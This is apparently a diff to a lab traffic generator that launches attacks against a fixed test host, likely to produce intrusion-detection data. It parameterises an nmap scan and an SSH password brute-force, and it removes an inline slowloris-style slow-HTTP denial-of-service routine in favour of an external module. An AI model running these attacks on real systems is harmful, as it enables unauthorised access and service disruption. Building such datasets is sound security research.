@@ -95,11 +95,13 @@ def http_action(
 
 
 def scan(campaign: Campaign, _: random.Random) -> None:
-    ports = campaign.profile.parameters["ports"]
+    config = campaign.profile.parameters
+    ports = config["ports"]
     campaign.reserve(actions=len(ports), estimated_outbound_bytes=0)
     started = time.time()
     command = [
-        "nmap", "-sS", "-Pn", "-T3", "--max-retries", "0",
+        "nmap", "-sS" if config.get("technique", "syn") == "syn" else "-sT",
+        "-Pn", f"-T{config.get('timing_template', 3)}", "--max-retries", "0",
         "-p", ",".join(map(str, ports)), VICTIM_IP,
     ]
     try:
@@ -154,7 +156,7 @@ def ssh_bruteforce(campaign: Campaign, rng: random.Random) -> None:
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
             client.connect(
-                VICTIM_IP, port=22, username="admin", password=password,
+                VICTIM_IP, port=22, username=config.get("username", "admin"), password=password,
                 look_for_keys=False, allow_agent=False,
                 timeout=max(0.2, min(2.0, campaign.remaining_seconds())),
                 auth_timeout=4.0, banner_timeout=4.0,
@@ -224,37 +226,8 @@ def http_load(campaign: Campaign, _: random.Random) -> None:
 
 
 def dos_slow(campaign: Campaign, _: random.Random) -> None:
-    config = campaign.profile.parameters
-    interval = config["fragment_interval_seconds"]
-    duration = config["duration_seconds"]
-    estimated = 120 + int(duration / interval + 1) * 18
-
-    def one_connection(_: int) -> None:
-        try:
-            campaign.reserve(estimated_outbound_bytes=estimated)
-        except BudgetExceeded:
-            return
-        started = time.time()
-        fragments = 0
-        try:
-            with socket.create_connection((VICTIM_IP, 80), timeout=2.0) as connection:
-                connection.settimeout(2.0)
-                connection.sendall(
-                    b"GET /lab/load HTTP/1.1\r\nHost: 192.168.100.10\r\n"
-                )
-                end = min(time.monotonic() + duration, campaign.deadline)
-                while time.monotonic() < end:
-                    connection.sendall(b"X-Lab-Pad: x\r\n")
-                    fragments += 1
-                    campaign.pause(interval)
-            campaign.record("slow_http_headers", started, success=fragments > 0,
-                            detail=f"{fragments} header fragments")
-        except OSError as exc:
-            campaign.record("slow_http_headers", started, success=False,
-                            detail=type(exc).__name__)
-
-    with ThreadPoolExecutor(max_workers=config["connections"]) as pool:
-        list(pool.map(one_connection, range(config["connections"])))
+    from slow_http import run_slow
+    return run_slow(campaign, _)
 
 
 def dos_syn(campaign: Campaign, _: random.Random) -> None:
@@ -339,13 +312,20 @@ def infiltration(campaign: Campaign, _: random.Random) -> None:
 
 HANDLERS = {
     "scan": scan,
+    "scan_connect": scan,
+    "scan_sparse": scan,
     "botnet": botnet,
+    "botnet_fast": botnet,
+    "botnet_slow": botnet,
     "ssh_bruteforce": ssh_bruteforce,
+    "ssh_bruteforce_fast": ssh_bruteforce,
+    "ssh_bruteforce_slow": ssh_bruteforce,
     "web_login": web_login,
     "web_sqli": web_sqli,
     "web_xss": web_xss,
     "dos_http": http_load,
     "dos_slow": dos_slow,
+    "benign_slow_http": dos_slow,
     "dos_syn": dos_syn,
     "ddos_http_loic": http_load,
     "ddos_http_hoic": http_load,
@@ -392,7 +372,24 @@ def main() -> int:
     parser.add_argument("--start-at-epoch", type=float, default=0.0)
     parser.add_argument("--max-campaigns", type=int, default=20)
     parser.add_argument("--max-runtime-seconds", type=int, default=300)
+    parser.add_argument('--slow-duration', type=float)
+    parser.add_argument('--slow-interval', type=float)
+    parser.add_argument('--slow-connections', type=int)
+    parser.add_argument('--slow-padding', type=int)
+    parser.add_argument('--slow-jitter', type=float)
     args = parser.parse_args()
+    overrides = {key: value for key, value in {
+        'duration': args.slow_duration, 'interval': args.slow_interval,
+        'connections': args.slow_connections, 'padding': args.slow_padding,
+        'jitter': args.slow_jitter}.items() if value is not None}
+    if overrides:
+        if args.attack not in ('dos_slow', 'benign_slow_http'):
+            parser.error('slow overrides require dos_slow or benign_slow_http')
+        from slow_http import configured_profile
+        try:
+            profiles[args.attack] = configured_profile(profiles[args.attack], **overrides)
+        except ValueError as error:
+            parser.error(str(error))
     if not 1 <= args.max_campaigns <= 20 or not 1 <= args.max_runtime_seconds <= 600:
         parser.error("continuous limits must be 1..20 campaigns and 1..600 seconds")
     if args.start_at_epoch:
